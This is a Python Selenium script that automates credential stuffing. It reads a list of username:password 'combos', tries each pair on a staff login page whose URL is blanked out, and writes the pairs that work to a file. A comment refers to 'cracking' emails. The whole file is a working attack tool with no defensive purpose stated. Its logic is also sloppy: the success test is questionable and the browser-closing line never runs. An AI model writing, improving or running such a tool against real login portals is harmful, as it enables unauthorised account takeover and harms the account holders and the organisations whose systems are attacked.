import time

import selenium
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
user = input("Directory to combos: ")
user = open(user,mode='r')
anal = open("suceededd.txt",mode='w')

def Check(Username,Password):
   # Username = Username.replace('@email.com','') IF CRACKING EMAILS USE THIS.
    option = webdriver.ChromeOptions()
    option.binary_location = r'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe'
    driver = webdriver.Chrome(executable_path=r'C:\WebDrivers\chromedriver.exe', options=option)
    driver.get("||||||||||LINK|||||||||")
    time.sleep(1)
    staffselect = Select(driver.find_element(by=By.ID, value='ember484'))
    staffselect.select_by_visible_text('Staff')
    inputid = driver.find_element(by=By.ID, value="identification")
    inputid.send_keys(Username)
    contine = driver.find_element(by=By.ID, value="authn-go-button")
    contine.click()
    time.sleep(1.5)
    try:
        password = driver.find_element(by=By.ID, value="ember557")
        contine2 = driver.find_element(by=By.ID, value="authn-go-button")
        password.send_keys(Password)
    except:
        print("Erorr: Too fast, retrying.")
        time.sleep(1)
    try:
        contine2.click()
        yeasd = driver.find_element(by=By.CLASS_NAME, value="cs-error")
        yeasd.click()
        return True
    except:
        return False
    time.sleep(5)
    driver.quit()
list = []
def combos():
    user2 = user.read()
    for combo in user2.split('\n'):

        yourcombo = combo.split(":")
        if Check(yourcombo[0],yourcombo[1]) == True:
            print("Success:", combo)
            list.append(combo)

        else:
            print("Fail:", combo)


combos()
anal.write(str(list))
anal.close()
user.close()






